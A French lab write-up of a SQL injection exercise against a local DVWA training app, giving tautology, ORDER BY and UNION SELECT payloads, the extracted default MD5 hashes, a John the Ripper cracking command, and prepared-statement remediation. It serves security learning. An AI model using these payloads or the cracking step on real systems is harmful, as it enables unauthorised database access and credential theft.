# SQL Injection — DVWA (Low Security)

**Date :** 08 Juin 2026  
**Cible :** DVWA local (Docker)  
**Difficulté :** Low  
**Catégorie :** Web — SQL Injection  

---

## Objectif

Exploiter une vulnérabilité SQL Injection sur DVWA pour extraire
les utilisateurs et mots de passe de la base de données.

---

## Recon

- Cible : http://127.0.0.1/vulnerabilities/sqli/
- Champ vulnérable : User ID (input non filtré)
- Test initial : entrer `1` → retourne admin/admin ✅
- Test guillemet : entrer `1'` → erreur SQL visible ✅
- Conclusion : le champ est vulnérable à la SQLi

---

## Exploitation

### Étape 1 — Lister tous les utilisateurs

**Payload :**
1' OR '1'='1' -- -
**Résultat :** tous les utilisateurs retournés
- admin / admin
- Gordon Brown
- Hack Me
- Pablo Picasso
- Bob Smith

**Explication :** La condition `OR '1'='1'` est toujours vraie,
ce qui force la requête à retourner tous les enregistrements.
Le `-- -` commente le reste de la requête originale.

---

### Étape 2 — Déterminer le nombre de colonnes

**Payload :**

1' ORDER BY 2 -- -
**Résultat :** pas d'erreur → la table a au moins 2 colonnes ✅

---

### Étape 3 — UNION attack pour extraire les hashes

**Payload :**
1' UNION SELECT user, password FROM users -- -
**Résultat :** hashes MD5 extraits pour tous les utilisateurs

| Username | Hash MD5 |
|----------|----------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

---

## Post-Exploitation — Crack des hashes

**Outil :** John the Ripper  
**Wordlist :** /usr/share/wordlists/rockyou.txt  
**Commande :**
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
**Résultat :** admin : password

Hash `5f4dcc3b5aa765d61d8327deb882cf99` = **password**

---

## Remédiation

Pour corriger cette vulnérabilité :

1. Utiliser des **requêtes préparées** (prepared statements)
2. Ne jamais injecter directement l'input utilisateur dans une requête SQL
3. Valider et filtrer tous les inputs côté serveur
4. Appliquer le principe du **moindre privilège** sur le compte BDD

**Code vulnérable :**
```php
$query = "SELECT * FROM users WHERE user_id = '$id'";
```

**Code corrigé :**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

---

## Leçons apprises

- Une erreur SQL visible = confirmation de vulnérabilité SQLi
- Le commentaire `-- -` permet d'ignorer le reste de la requête
- UNION SELECT permet d'extraire des données d'autres tables
- MD5 est un algorithme faible, crackable en quelques secondes
- John the Ripper + rockyou.txt = combo efficace pour les hashes faibles

---

## Outils utilisés

- DVWA (cible vulnérable)
- Navigateur Firefox
- John the Ripper
- /usr/share/wordlists/rockyou.txt  
